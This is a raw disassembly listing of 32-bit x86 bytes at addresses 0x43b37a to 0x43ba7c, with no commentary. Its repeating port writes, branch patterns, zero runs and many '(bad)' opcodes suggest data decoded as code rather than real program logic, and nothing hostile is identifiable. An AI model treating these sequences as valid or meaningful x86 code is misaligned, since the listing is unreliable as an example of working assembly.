  43b37a:	add    BYTE PTR [edi-0x64fc1903],al
  43b380:	std    
  43b381:	out    0x3,al
  43b383:	and    eax,0x2903e6fc
  43b388:	cld    
  43b389:	out    0x3,al
  43b38b:	cmp    eax,0xe103e6fc
  43b390:	sti    
  43b391:	out    0x3,al
  43b393:	pop    eax
  43b394:	sti    
  43b395:	(bad)  
  43b396:	call   0xe94a1211
  43b39b:	jbe    0x43b337
  43b39d:	push   cs
  43b39e:	jmp    0xe94a1a19
  43b3a3:	jbe    0x43b407
  43b3a5:	push   es
  43b3a6:	jmp    0xe94a2221
  43b3ab:	jbe    0x43b417
  43b3ad:	push   es
  43b3ae:	jmp    0xe94a2a29
  43b3b3:	jbe    0x43b427
  43b3b5:	push   es
  43b3b6:	jmp    0xe94a3231
  43b3bb:	jbe    0x43b437
  43b3bd:	push   es
  43b3be:	jmp    0xe94a3a39
  43b3c3:	jbe    0x43b347
  43b3c5:	push   es
  43b3c6:	jmp    0xe94a3241
  43b3cb:	jbe    0x43b3eb
  43b3cd:	or     ch,cl
  43b3cf:	jbe    0x43b367
  43b3d1:	add    eax,0x59276e9
  43b3d6:	jmp    0xe9495251
  43b3db:	jbe    0x43b377
  43b3dd:	add    eax,0xe9
  43b3e2:	add    BYTE PTR [eax],al
  43b3e4:	jbe    0x43b38c
  43b3e6:	add    eax,0x5a276e9
  43b3eb:	jmp    0xe9496266
  43b3f0:	jbe    0x43b39c
  43b3f2:	add    eax,0x5b676e9
  43b3f7:	jmp    0xe9496672
  43b3fc:	jbe    0x43b3bc
  43b3fe:	add    eax,0x5ba76e9
  43b403:	jmp    0xe94de97e
  43b408:	jbe    0x43b3bc
  43b40a:	add    eax,0x5be76e9
  43b40f:	jmp    0x496e8a
  43b414:	sbb    al,0x2
  43b416:	inc    esp
  43b417:	or     cl,BYTE PTR [edx+eax*1]
  43b41a:	inc    eax
  43b41b:	or     cl,BYTE PTR [edx+eax*1]
  43b41e:	cmp    al,0xa
  43b420:	sbb    al,0x2
  43b422:	cmp    BYTE PTR [edx],cl
  43b424:	sbb    al,0x2
  43b426:	xor    al,0xa
  43b428:	or     al,0x2
  43b42a:	and    BYTE PTR [edx],cl
  43b42c:	or     al,0x2
  43b42e:	sbb    al,0xa
  43b430:	fadd   QWORD PTR [ecx]
  43b432:	sbb    BYTE PTR [edx],cl
  43b434:	fadd   QWORD PTR [ecx]
  43b436:	adc    al,0xa
  43b438:	int3   
  43b439:	add    DWORD PTR [eax],edx
  43b43b:	or     cl,ah
  43b43d:	add    DWORD PTR [edx+ecx*1],ecx
  43b440:	fadd   QWORD PTR [ecx]
  43b442:	mov    eax,ds:0x401dc0b
  43b447:	or     al,BYTE PTR [eax]
  43b449:	add    BYTE PTR [eax],al
  43b44b:	add    BYTE PTR [eax],al
  43b44d:	int3   
  43b44e:	add    DWORD PTR [eax],eax
  43b450:	or     cl,ah
  43b452:	add    esp,edi
  43b454:	or     DWORD PTR [ecx+eax*1+0x19c09f8],ebx
  43b45b:	hlt    
  43b45c:	or     DWORD PTR [ecx+eax*1+0x18c09f0],ecx
  43b463:	in     al,dx
  43b464:	or     DWORD PTR [ecx+eax*1+0x19c09e8],ebx
  43b46b:	in     al,0x9
  43b46d:	mov    WORD PTR [ecx],es
  43b46f:	loopne 0x43b47a
  43b471:	mov    WORD PTR [ecx],es
  43b473:	fmul   QWORD PTR [ecx]
  43b475:	pop    esp
  43b476:	add    eax,ebx
  43b478:	or     DWORD PTR [ecx+eax*1-0x2c],ebx
  43b47c:	or     DWORD PTR [ecx+eax*1-0x30],ecx
  43b480:	or     DWORD PTR [ecx+eax*1-0x34],ecx
  43b484:	or     DWORD PTR [ecx+eax*1+0x61],ebx
  43b488:	or     ebx,DWORD PTR [ecx+eax*1-0x3c]
  43b48c:	or     DWORD PTR [ecx+eax*1-0x40],ecx
  43b490:	or     DWORD PTR [ebp+0x1b],esi
  43b493:	std    
  43b494:	mov    ebx,0xb7fd1b7c
  43b499:	jl     0x43b4b6
  43b49b:	std    
  43b49c:	mov    bl,0x6c
  43b49e:	sbb    edi,ebp
  43b4a0:	scas   eax,DWORD PTR es:[edi]
  43b4a1:	ins    BYTE PTR es:[edi],dx
  43b4a2:	sbb    edi,ebp
  43b4a4:	stos   DWORD PTR es:[edi],eax
  43b4a5:	jl     0x43b4c2
  43b4a7:	std    
  43b4a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b4a9:	jl     0x43b4c6
  43b4ab:	std    
  43b4ac:	mov    ds:0xfbfd1b6c,eax
  43b4b1:	add    BYTE PTR [eax],al
  43b4b3:	add    BYTE PTR [eax],al
  43b4b5:	add    BYTE PTR [esi+0x1b],ch
  43b4b8:	std    
  43b4b9:	fwait
  43b4ba:	jl     0x43b4d7
  43b4bc:	std    
  43b4bd:	xchg   edi,eax
  43b4be:	jl     0x43b4db
  43b4c0:	std    
  43b4c1:	xchg   ebx,eax
  43b4c2:	ins    BYTE PTR es:[edi],dx
  43b4c3:	sbb    edi,ebp
  43b4c5:	(bad)  
  43b4c6:	ins    BYTE PTR es:[edi],dx
  43b4c7:	sbb    edi,ebp
  43b4c9:	mov    edi,DWORD PTR [ebx+ebx*1-0x3]
  43b4cd:	xchg   DWORD PTR [ebx+ebx*1-0x3],edi
  43b4d1:	sub    DWORD PTR [ebx+ebx*1-0x3],0x7f
  43b4d6:	ins    BYTE PTR es:[edi],dx
  43b4d7:	sbb    edi,ebp
  43b4d9:	jnp    0x43b557
  43b4db:	sbb    edi,ebp
  43b4dd:	ja     0x43b55b
  43b4df:	sbb    edi,ebp
  43b4e1:	jae    0x43b54f
  43b4e3:	sbb    edi,ebp
  43b4e5:	outs   dx,DWORD PTR ds:[esi]
  43b4e6:	ins    BYTE PTR es:[edi],dx
  43b4e7:	sbb    edi,ebp
  43b4e9:	imul   edi,DWORD PTR [ebx+ebx*1-0x3],0x67
  43b4ee:	jl     0x43b50b
  43b4f0:	std    
  43b4f1:	int    0x6e
  43b4f3:	sbb    edi,ebp
  43b4f5:	pop    edi
  43b4f6:	ins    BYTE PTR es:[edi],dx
  43b4f7:	sbb    edi,ebp
  43b4f9:	pop    ebx
  43b4fa:	jl     0x43b515
  43b4fc:	std    
  43b4fd:	push   edi
  43b4fe:	jl     0x43b519
  43b500:	std    
  43b501:	push   ebx
  43b502:	ins    BYTE PTR es:[edi],dx
  43b503:	sbb    ebp,edi
  43b505:	dec    edi
  43b506:	ins    BYTE PTR es:[edi],dx
  43b507:	sbb    ebp,edi
  43b509:	dec    ebx
  43b50a:	jl     0x43b525
  43b50c:	std    
  43b50d:	inc    edi
  43b50e:	jl     0x43b512
  43b510:	out    0x3,eax
  43b512:	mov    ecx,0xb503e6f9
  43b517:	stc    
  43b518:	out    0x3,al
  43b51a:	add    BYTE PTR [eax],al
  43b51c:	add    BYTE PTR [eax],al
  43b51e:	add    BYTE PTR [ecx-0x7],dh
  43b521:	out    0x3,al
  43b523:	ins    DWORD PTR es:[edi],dx
  43b524:	stc    
  43b525:	out    0x3,al
  43b527:	imul   edi,ecx,0xf7ff03e6
  43b52d:	out    0x3,al
  43b52f:	jmp    0x43b528
  43b531:	out    0x3,al
  43b533:	out    0xf7,eax
  43b535:	out    0x3,al
  43b537:	repz mul esi
  43b53a:	add    eax,DWORD PTR [edx-0x7]
  43b53d:	out    0x3,al
  43b53f:	sti    
  43b540:	mul    esi
  43b542:	add    esi,edi
  43b544:	mul    esi
  43b546:	add    esp,DWORD PTR [ebx-0x9]
  43b549:	out    0x3,al
  43b54b:	xchg   edx,eax
  43b54c:	stc    
  43b54d:	out    0x3,al
  43b54f:	xchg   esi,eax
  43b550:	stc    
  43b551:	out    0x3,al
  43b553:	inc    edi
  43b554:	mul    esi
  43b556:	add    ebx,DWORD PTR [esi-0x7]
  43b559:	out    0x3,al
  43b55b:	dec    edi
  43b55c:	mul    esi
  43b55e:	add    ebx,DWORD PTR [ebx]
  43b560:	mul    esi
  43b562:	add    edx,DWORD PTR [edi]
  43b564:	mul    esi
  43b566:	add    eax,DWORD PTR [ebx-0x9]
  43b569:	out    0x3,al
  43b56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b56c:	cli    
  43b56d:	out    0x3,al
  43b56f:	mov    eax,ds:0x9d03e6fa
  43b574:	cli    
  43b575:	out    0x3,al
  43b577:	xor    esi,edi
  43b579:	out    0x3,al
  43b57b:	cmp    dl,0xe6
  43b57e:	add    esp,DWORD PTR [esi-0x6]
  43b581:	out    0x3,al
  43b583:	add    BYTE PTR [eax],al
  43b585:	add    BYTE PTR [eax],al
  43b587:	add    BYTE PTR [edx-0x6],bl
  43b58a:	out    0x3,al
  43b58c:	dec    esi
  43b58d:	cli    
  43b58e:	out    0x3,al
  43b590:	push   edx
  43b591:	cli    
  43b592:	(bad)  
  43b593:	call   0xe94bd50e
  43b598:	jbe    0x43b56a
  43b59a:	add    al,0xe9
  43b59c:	jbe    0x43b57a
  43b59e:	add    al,0xe9
  43b5a0:	jbe    0x43b5d5
  43b5a2:	or     cl,ch
  43b5a4:	jbe    0x43b5d5
  43b5a6:	or     cl,ch
  43b5a8:	jbe    0x43b5e5
  43b5aa:	or     cl,ch
  43b5ac:	jbe    0x43b5e5
  43b5ae:	or     cl,ch
  43b5b0:	jbe    0x43b59a
  43b5b2:	add    al,0xe9
  43b5b4:	jbe    0x43b5aa
  43b5b6:	add    al,0xe9
  43b5b8:	jbe    0x43b5aa
  43b5ba:	add    al,0xe9
  43b5bc:	jbe    0x43b5ba
  43b5be:	add    al,0xe9
  43b5c0:	jbe    0x43b615
  43b5c2:	or     cl,ch
  43b5c4:	jbe    0x43b615
  43b5c6:	or     cl,ch
  43b5c8:	jbe    0x43b625
  43b5ca:	or     cl,ch
  43b5cc:	jbe    0x43b625
  43b5ce:	or     cl,ch
  43b5d0:	jbe    0x43b635
  43b5d2:	or     cl,ch
  43b5d4:	jbe    0x43b635
  43b5d6:	or     cl,ch
  43b5d8:	jbe    0x43b5ea
  43b5da:	push   es
  43b5db:	jmp    0xe94c1d56
  43b5e0:	jbe    0x43b655
  43b5e2:	or     cl,ch
  43b5e4:	jbe    0x43b655
  43b5e6:	or     cl,ch
  43b5e8:	jbe    0x43b665
  43b5ea:	or     cl,ch
  43b5ec:	add    BYTE PTR [eax],al
  43b5ee:	add    BYTE PTR [eax],al
  43b5f0:	add    BYTE PTR [esi+0x77],dh
  43b5f3:	or     cl,ch
  43b5f5:	jbe    0x43b57a
  43b5f7:	or     cl,ch
  43b5f9:	jbe    0x43b67a
  43b5fb:	or     cl,ch
  43b5fd:	jbe    0x43b58a
  43b5ff:	pop    es
  43b600:	jmp    0xe94b3d7b
  43b605:	jbe    0x43b59a
  43b607:	pop    es
  43b608:	jmp    0xe94b4b83
  43b60d:	jbe    0x43b653
  43b60f:	push   es
  43b610:	add    BYTE PTR [esi+eax*1-0x46],cl
  43b614:	or     cl,BYTE PTR [esi+eax*1-0x4a]
  43b618:	or     bl,BYTE PTR [esi+eax*1-0x4e]
  43b61c:	or     bl,BYTE PTR [esi+eax*1-0x52]
  43b620:	or     cl,BYTE PTR [esi+eax*1-0x56]
  43b624:	or     cl,BYTE PTR [esi+eax*1-0x5a]
  43b628:	or     bl,BYTE PTR [esi+eax*1]
  43b62b:	mov    ds:0x9e061c0a,al
  43b630:	or     cl,BYTE PTR [esi+eax*1]
  43b633:	call   0x1c0a:0x96060c0a
  43b63a:	push   es
  43b63b:	xchg   edx,eax
  43b63c:	or     bl,BYTE PTR [esi+eax*1]
  43b63f:	mov    cs,WORD PTR [edx]
  43b641:	or     al,0x6
  43b643:	mov    cl,BYTE PTR [edx]
  43b645:	or     al,0x6
  43b647:	xchg   BYTE PTR [edx],cl
  43b649:	fadd   QWORD PTR ds:0x5dc0a82
  43b64f:	jle    0x43b65b
  43b651:	int3   
  43b652:	add    eax,0xa7a
  43b657:	add    BYTE PTR [eax],al
  43b659:	add    ah,cl
  43b65b:	add    eax,0x5dc0a76
  43b660:	jb     0x43b66c
  43b662:	fadd   QWORD PTR ds:0x5cc0a6e
  43b668:	push   0xa
  43b66a:	int3   
  43b66b:	add    eax,0x59c0a66
  43b670:	bound  ecx,QWORD PTR [edx]
  43b672:	pushf  
  43b673:	add    eax,0x58c0a5e
  43b678:	pop    edx
  43b679:	or     cl,BYTE PTR [ebp+eax*1+0x59c0a56]
  43b680:	push   edx
  43b681:	or     bl,BYTE PTR [ebp+eax*1+0x58c0a4e]
  43b688:	dec    edx
  43b689:	or     cl,BYTE PTR [ebp+eax*1+0x1b750a46]
  43b690:	std    
  43b691:	inc    ebp
  43b692:	jg     0x43b6af
  43b694:	std    
  43b695:	inc    ecx
  43b696:	outs   dx,DWORD PTR ds:[esi]
  43b697:	sbb    edi,ebp
  43b699:	cmp    eax,0x39fd1b6f
  43b69e:	jg     0x43b6bb
  43b6a0:	std    
  43b6a1:	xor    eax,0x31fd1b7f
  43b6a6:	outs   dx,DWORD PTR ds:[esi]
  43b6a7:	sbb    edi,ebp
  43b6a9:	sub    eax,0x29fd1b6f
  43b6ae:	jg     0x43b6cb
  43b6b0:	std    
  43b6b1:	and    eax,0x21fd1b7f
  43b6b6:	outs   dx,DWORD PTR ds:[esi]
  43b6b7:	sbb    edi,ebp
  43b6b9:	sbb    eax,0x19fd1b6f
  43b6be:	add    BYTE PTR [eax],al
  43b6c0:	add    BYTE PTR [eax],al
  43b6c2:	add    BYTE PTR [edi+0x1b],bh
  43b6c5:	std    
  43b6c6:	adc    eax,0x11fd1b7f
  43b6cb:	outs   dx,DWORD PTR ds:[esi]
  43b6cc:	sbb    edi,ebp
  43b6ce:	or     eax,0x9fd1b6f
  43b6d3:	jg     0x43b6f0
  43b6d5:	std    
  43b6d6:	add    eax,0x1fd1b7f
  43b6db:	outs   dx,DWORD PTR ds:[esi]
  43b6dc:	sbb    edi,ebp
  43b6de:	std    
  43b6df:	ins    BYTE PTR es:[edi],dx
  43b6e0:	sbb    edi,ebp
  43b6e2:	stc    
  43b6e3:	jl     0x43b700
  43b6e5:	std    
  43b6e6:	cmc    
  43b6e7:	jl     0x43b704
  43b6e9:	std    
  43b6ea:	icebp  
  43b6eb:	ins    BYTE PTR es:[edi],dx
  43b6ec:	sbb    edi,ebp
  43b6ee:	in     eax,dx
  43b6ef:	ins    BYTE PTR es:[edi],dx
  43b6f0:	sbb    edi,ebp
  43b6f2:	jmp    0xe640d273
  43b6f7:	jl     0x43b714
  43b6f9:	std    
  43b6fa:	loope  0x43b768
  43b6fc:	sbb    edi,ebp
  43b6fe:	(bad)  [ebx+ebx*1-0x3]
  43b702:	fnstcw WORD PTR [ebx+ebx*1-0x3]
  43b706:	aad    0x7c
  43b708:	sbb    edi,ebp
  43b70a:	shr    DWORD PTR [edx+eax*1-0x19],1
  43b70e:	add    ebp,DWORD PTR [ebx+0x3f03e6fa]
  43b714:	cli    
  43b715:	out    0x3,al
  43b717:	xor    edi,edx
  43b719:	out    0x3,al
  43b71b:	aaa    
  43b71c:	cli    
  43b71d:	out    0x3,al
  43b71f:	sbb    edi,edx
  43b721:	out    0x3,al
  43b723:	psubd  mm4,mm6
  43b726:	add    eax,DWORD PTR [eax]
  43b728:	add    BYTE PTR [eax],al
  43b72a:	add    BYTE PTR [eax],al
  43b72c:	add    edi,edx
  43b72e:	out    0x3,al
  43b730:	pop    es
  43b731:	cli    
  43b732:	out    0x3,al
  43b734:	or     edi,edx
  43b736:	out    0x3,al
  43b738:	(bad)  
  43b73a:	out    0x3,al
  43b73c:	sar    ecx,cl
  43b73e:	out    0x3,al
  43b740:	xlat   BYTE PTR ds:[ebx]
  43b741:	stc    
  43b742:	out    0x3,al
  43b744:	sti    
  43b745:	stc    
  43b746:	out    0x3,al
  43b748:	out    dx,eax
  43b749:	stc    
  43b74a:	out    0x3,al
  43b74c:	jecxz  0x43b747
  43b74e:	out    0x3,al
  43b750:	out    0xf9,eax
  43b752:	out    0x3,al
  43b754:	jmp    0x43b74f
  43b756:	out    0x3,al
  43b758:	(bad)  
  43b759:	stc    
  43b75a:	out    0x3,al
  43b75c:	repz stc 
  43b75e:	out    0x3,al
  43b760:	idiv   ecx
  43b762:	out    0x3,al
  43b764:	pop    ebx
  43b765:	stc    
  43b766:	out    0x3,al
  43b768:	dec    edi
  43b769:	stc    
  43b76a:	out    0x3,al
  43b76c:	inc    ebx
  43b76d:	stc    
  43b76e:	out    0x3,al
  43b770:	inc    edi
  43b771:	stc    
  43b772:	out    0x3,al
  43b774:	dec    ebx
  43b775:	stc    
  43b776:	out    0x3,al
  43b778:	pop    ds
  43b779:	stc    
  43b77a:	out    0x3,al
  43b77c:	adc    edi,ecx
  43b77e:	out    0x3,al
  43b780:	pop    ss
  43b781:	stc    
  43b782:	out    0x3,al
  43b784:	cmp    edi,ecx
  43b786:	out    0x3,al
  43b788:	das    
  43b789:	stc    
  43b78a:	(bad)  
  43b78b:	call   0xe94a6806
  43b790:	add    BYTE PTR [eax],al
  43b792:	add    BYTE PTR [eax],al
  43b794:	add    BYTE PTR [esi-0x4c],dh
  43b797:	push   es
  43b798:	jmp    0xe94a7013
  43b79d:	jbe    0x43b75b
  43b79f:	push   es
  43b7a0:	jmp    0xe94a781b
  43b7a5:	jbe    0x43b76b
  43b7a7:	push   es
  43b7a8:	jmp    0xe94a8023
  43b7ad:	jbe    0x43b77b
  43b7af:	push   es
  43b7b0:	jmp    0xe94a882b
  43b7b5:	jbe    0x43b78b
  43b7b7:	push   es
  43b7b8:	jmp    0xe94a9033
  43b7bd:	jbe    0x43b79b
  43b7bf:	push   es
  43b7c0:	jmp    0xe94a983b
  43b7c5:	jbe    0x43b7ab
  43b7c7:	push   es
  43b7c8:	jmp    0xe94aa043
  43b7cd:	jbe    0x43b7bb
  43b7cf:	push   es
  43b7d0:	jmp    0xe94aa84b
  43b7d5:	jbe    0x43b7cb
  43b7d7:	push   es
  43b7d8:	jmp    0xe94ab053
  43b7dd:	jbe    0x43b7db
  43b7df:	push   es
  43b7e0:	jmp    0xe94ab85b
  43b7e5:	jbe    0x43b7eb
  43b7e7:	pop    es
  43b7e8:	jmp    0xe94bc063
  43b7ed:	jbe    0x43b7fb
  43b7ef:	or     cl,ch
  43b7f1:	jbe    0x43b803
  43b7f3:	or     cl,ch
  43b7f5:	jbe    0x43b80b
  43b7f7:	or     cl,ch
  43b7f9:	add    BYTE PTR [eax],al
  43b7fb:	add    BYTE PTR [eax],al
  43b7fd:	add    BYTE PTR [esi+0x18],dh
  43b800:	or     cl,ch
  43b802:	jbe    0x43b820
  43b804:	or     cl,ch
  43b806:	jbe    0x43b828
  43b808:	or     cl,ch
  43b80a:	jbe    0x43b830
  43b80c:	or     BYTE PTR [eax],al
  43b80e:	mov    WORD PTR [edx],es
  43b810:	fimul  DWORD PTR [eax]
  43b812:	pushf  
  43b813:	add    dl,dh
  43b815:	or     BYTE PTR [edx+eax*1+0x28c08d2],bl
  43b81c:	into   
  43b81d:	or     BYTE PTR [edx+eax*1+0x25c08ca],cl
  43b824:	(bad)  
  43b825:	or     BYTE PTR [edx+eax*1-0x3e],bl
  43b829:	or     BYTE PTR [edx+eax*1-0x42],cl
  43b82d:	or     BYTE PTR [edx+eax*1-0x46],cl
  43b831:	or     BYTE PTR [edx+eax*1-0x4a],bl
  43b835:	or     BYTE PTR [edx+eax*1-0x4e],bl
  43b839:	or     BYTE PTR [edx+eax*1-0x52],cl
  43b83d:	or     BYTE PTR [edx+eax*1-0x56],cl
  43b841:	or     BYTE PTR [edx+eax*1],bl
  43b844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b845:	or     BYTE PTR [edx+eax*1],bl
  43b848:	mov    ds:0x9e020c08,al
  43b84d:	or     BYTE PTR [edx+eax*1],cl
  43b850:	call   0x1c08:0x96021c08
  43b857:	add    dl,BYTE PTR [edx-0x71fdf3f8]
  43b85d:	or     BYTE PTR [edx+eax*1],cl
  43b860:	mov    cl,BYTE PTR [eax]
  43b862:	add    BYTE PTR [eax],al
  43b864:	add    BYTE PTR [eax],al
  43b866:	add    ah,bl
  43b868:	add    DWORD PTR [esi-0x7dfe23f8],eax
  43b86e:	or     ah,cl
  43b870:	add    DWORD PTR [esi+0x8],edi
  43b873:	int3   
  43b874:	add    DWORD PTR [edx+0x8],edi
  43b877:	fadd   QWORD PTR [ecx]
  43b879:	jbe    0x43b883
  43b87b:	fadd   QWORD PTR [ecx]
  43b87d:	jb     0x43b887
  43b87f:	int3   
  43b880:	add    DWORD PTR [esi+0x8],ebp
  43b883:	int3   
  43b884:	add    DWORD PTR [edx+0x8],ebp
  43b887:	pushf  
  43b888:	add    DWORD PTR [esi+0x8],esp
  43b88b:	jne    0x43b8a8
  43b88d:	std    
  43b88e:	gs ins DWORD PTR es:[edi],dx
  43b890:	sbb    edi,ebp
  43b892:	popa   
  43b893:	ins    DWORD PTR es:[edi],dx
  43b894:	sbb    edi,ebp
  43b896:	pop    ebp
  43b897:	jge    0x43b8b4
  43b899:	std    
  43b89a:	pop    ecx
  43b89b:	jge    0x43b8b8
  43b89d:	std    
  43b89e:	push   ebp
  43b89f:	ins    DWORD PTR es:[edi],dx
  43b8a0:	sbb    edi,ebp
  43b8a2:	push   ecx
  43b8a3:	ins    DWORD PTR es:[edi],dx
  43b8a4:	sbb    edi,ebp
  43b8a6:	dec    ebp
  43b8a7:	jge    0x43b8c4
  43b8a9:	std    
  43b8aa:	dec    ecx
  43b8ab:	jge    0x43b8c8
  43b8ad:	std    
  43b8ae:	inc    ebp
  43b8af:	ins    DWORD PTR es:[edi],dx
  43b8b0:	sbb    edi,ebp
  43b8b2:	inc    ecx
  43b8b3:	ins    DWORD PTR es:[edi],dx
  43b8b4:	sbb    edi,ebp
  43b8b6:	cmp    eax,0x39fd1b7d
  43b8bb:	jge    0x43b8d8
  43b8bd:	std    
  43b8be:	xor    eax,0x31fd1b6d
  43b8c3:	ins    DWORD PTR es:[edi],dx
  43b8c4:	sbb    edi,ebp
  43b8c6:	sub    eax,0x29fd1b7d
  43b8cb:	add    BYTE PTR [eax],al
  43b8cd:	add    BYTE PTR [eax],al
  43b8cf:	add    BYTE PTR [ebp+0x1b],bh
  43b8d2:	std    
  43b8d3:	and    eax,0x21fd1b6d
  43b8d8:	ins    DWORD PTR es:[edi],dx
  43b8d9:	sbb    edi,ebp
  43b8db:	sbb    eax,0x19fd1b7d
  43b8e0:	jge    0x43b8fd
  43b8e2:	std    
  43b8e3:	adc    eax,0x11fd1b6d
  43b8e8:	ins    DWORD PTR es:[edi],dx
  43b8e9:	sbb    edi,ebp
  43b8eb:	or     eax,0x28fd1b7d
  43b8f0:	jb     0x43b90d
  43b8f2:	std    
  43b8f3:	and    al,0x7a
  43b8f5:	sbb    edi,ebp
  43b8f7:	add    DWORD PTR [ebp+0x1b],ebp
  43b8fa:	std    
  43b8fb:	std    
  43b8fc:	jp     0x43b919
  43b8fe:	std    
  43b8ff:	stc    
  43b900:	jb     0x43b91d
  43b902:	std    
  43b903:	cmc    
  43b904:	jp     0x43b921
  43b906:	std    
  43b907:	icebp  
  43b908:	jb     0x43b90c
  43b90a:	out    0x3,eax
  43b90c:	mov    ds:0x9f03e6fc,eax
  43b911:	cld    
  43b912:	out    0x3,al
  43b914:	fwait
  43b915:	cld    
  43b916:	out    0x3,al
  43b918:	xchg   edi,eax
  43b919:	cld    
  43b91a:	out    0x3,al
  43b91c:	mov    bl,0xfc
  43b91e:	out    0x3,al
  43b920:	scas   eax,DWORD PTR es:[edi]
  43b921:	cld    
  43b922:	out    0x3,al
  43b924:	stos   DWORD PTR es:[edi],eax
  43b925:	cld    
  43b926:	out    0x3,al
  43b928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b929:	cld    
  43b92a:	out    0x3,al
  43b92c:	inc    ebx
  43b92d:	cld    
  43b92e:	out    0x3,al
  43b930:	aas    
  43b931:	cld    
  43b932:	out    0x3,al
  43b934:	add    BYTE PTR [eax],al
  43b936:	add    BYTE PTR [eax],al
  43b938:	add    BYTE PTR [ebx],bh
  43b93a:	cld    
  43b93b:	out    0x3,al
  43b93d:	aaa    
  43b93e:	cld    
  43b93f:	out    0x3,al
  43b941:	adc    edi,esp
  43b943:	out    0x3,al
  43b945:	paddb  mm4,mm6
  43b948:	add    ecx,DWORD PTR [ebx]
  43b94a:	cld    
  43b94b:	out    0x3,al
  43b94d:	pop    es
  43b94e:	cld    
  43b94f:	out    0x3,al
  43b951:	jecxz  0x43b94e
  43b953:	out    0x3,al
  43b955:	nop
  43b956:	std    
  43b957:	out    0x3,al
  43b959:	xchg   esp,eax
  43b95a:	std    
  43b95b:	out    0x3,al
  43b95d:	mov    eax,0xac03e6fd
  43b962:	std    
  43b963:	out    0x3,al
  43b965:	mov    al,ds:0xa403e6fd
  43b96a:	std    
  43b96b:	out    0x3,al
  43b96d:	test   al,0xfd
  43b96f:	out    0x3,al
  43b971:	cdq    
  43b972:	std    
  43b973:	out    0x3,al
  43b975:	(bad)  
  43b976:	sti    
  43b977:	out    0x3,al
  43b979:	sti    
  43b97a:	sti    
  43b97b:	out    0x3,al
  43b97d:	idiv   ebx
  43b97f:	out    0x3,al
  43b981:	push   ebx
  43b982:	sti    
  43b983:	out    0x3,al
  43b985:	cmp    ch,0xff
  43b988:	call   0xe9468b03
  43b98d:	jbe    0x43b964
  43b98f:	add    ch,cl
  43b991:	jbe    0x43b96c
  43b993:	add    ch,cl
  43b995:	jbe    0x43b92f
  43b997:	add    cl,ch
  43b999:	jbe    0x43b937
  43b99b:	add    cl,ch
  43b99d:	add    BYTE PTR [eax],al
  43b99f:	add    BYTE PTR [eax],al
  43b9a1:	add    BYTE PTR [esi-0x60],dh
  43b9a4:	add    cl,ch
  43b9a6:	jbe    0x43b94c
  43b9a8:	add    cl,ch
  43b9aa:	jbe    0x43b954
  43b9ac:	add    cl,ch
  43b9ae:	jbe    0x43b95c
  43b9b0:	add    cl,ch
  43b9b2:	jbe    0x43b964
  43b9b4:	add    cl,ch
  43b9b6:	jbe    0x43b96c
  43b9b8:	add    cl,ch
  43b9ba:	jbe    0x43b9b9
  43b9bc:	add    ch,cl
  43b9be:	jbe    0x43b9c1
  43b9c0:	add    ebp,ecx
  43b9c2:	jbe    0x43b9c9
  43b9c4:	add    al,0xe9
  43b9c6:	jbe    0x43b98c
  43b9c8:	add    cl,ch
  43b9ca:	jbe    0x43b994
  43b9cc:	add    cl,ch
  43b9ce:	jbe    0x43b99c
  43b9d0:	add    cl,ch
  43b9d2:	jbe    0x43b9a4
  43b9d4:	add    cl,ch
  43b9d6:	jbe    0x43b9ac
  43b9d8:	add    cl,ch
  43b9da:	jbe    0x43b9b4
  43b9dc:	add    cl,ch
  43b9de:	jbe    0x43b9bc
  43b9e0:	add    cl,ch
  43b9e2:	jbe    0x43b9c4
  43b9e4:	add    cl,ch
  43b9e6:	jbe    0x43b9cc
  43b9e8:	add    cl,ch
  43b9ea:	jbe    0x43b9d4
  43b9ec:	add    cl,ch
  43b9ee:	jbe    0x43b9dc
  43b9f0:	add    cl,ch
  43b9f2:	jbe    0x43b9e4
  43b9f4:	add    cl,ch
  43b9f6:	jbe    0x43b9ec
  43b9f8:	add    cl,ch
  43b9fa:	jbe    0x43b9f4
  43b9fc:	add    cl,ch
  43b9fe:	jbe    0x43b9fc
  43ba00:	add    cl,ch
  43ba02:	jbe    0x43ba04
  43ba04:	add    DWORD PTR [eax],eax
  43ba06:	add    BYTE PTR [eax],al
  43ba08:	add    BYTE PTR [eax],al
  43ba0a:	add    ah,bl
  43ba0c:	(bad)  
  43ba0d:	stc    
  43ba0e:	push   es
  43ba0f:	fdiv   st(6),st
  43ba11:	cmc    
  43ba12:	push   es
  43ba13:	int3   
  43ba14:	(bad)  
  43ba15:	icebp  
  43ba16:	push   es
  43ba17:	int3   
  43ba18:	(bad)  
  43ba19:	in     eax,dx
  43ba1a:	push   es
  43ba1b:	pushf  
  43ba1c:	(bad)  
  43ba1d:	jmp    0xe6425628
  43ba22:	push   es
  43ba23:	mov    esi,?
  43ba25:	loope  0x43ba2d
  43ba27:	mov    esi,?
  43ba29:	fld    QWORD PTR [esi]
  43ba2b:	pushf  
  43ba2c:	(bad)  
  43ba2d:	fld    DWORD PTR [esi]
  43ba2f:	pushf  
  43ba30:	(bad)  
  43ba31:	aad    0x6
  43ba33:	mov    esi,?
  43ba35:	rol    DWORD PTR [esi],1
  43ba37:	mov    esi,?
  43ba39:	int    0x6
  43ba3b:	pop    esp
  43ba3c:	push   es
  43ba3d:	retf   0x5c06
  43ba40:	push   es
  43ba41:	add    DWORD PTR [esp+ecx*2],0x6
  43ba45:	jg     0x43ba4b
  43ba47:	dec    esp
  43ba48:	push   es
  43ba49:	jnp    0x43ba4f
  43ba4b:	pop    esp
  43ba4c:	push   es
  43ba4d:	mov    edx,0xb6065c06
  43ba52:	push   es
  43ba53:	dec    esp
  43ba54:	push   es
  43ba55:	mov    dl,0x6
  43ba57:	dec    esp
  43ba58:	push   es
  43ba59:	scas   al,BYTE PTR es:[edi]
  43ba5a:	push   es
  43ba5b:	sbb    al,0x6
  43ba5d:	stos   BYTE PTR es:[edi],al
  43ba5e:	push   es
  43ba5f:	sbb    al,0x6
  43ba61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ba62:	push   es
  43ba63:	or     al,0x6
  43ba65:	mov    ds:0x9e060c06,al
  43ba6a:	push   es
  43ba6b:	sbb    al,0x6
  43ba6d:	call   0x0:0x6
  43ba74:	sbb    al,0x6
  43ba76:	xchg   esi,eax
  43ba77:	push   es
  43ba78:	or     al,0x6
  43ba7a:	xchg   edx,eax
  43ba7b:	push   es
  43ba7c:	or     al,0x6
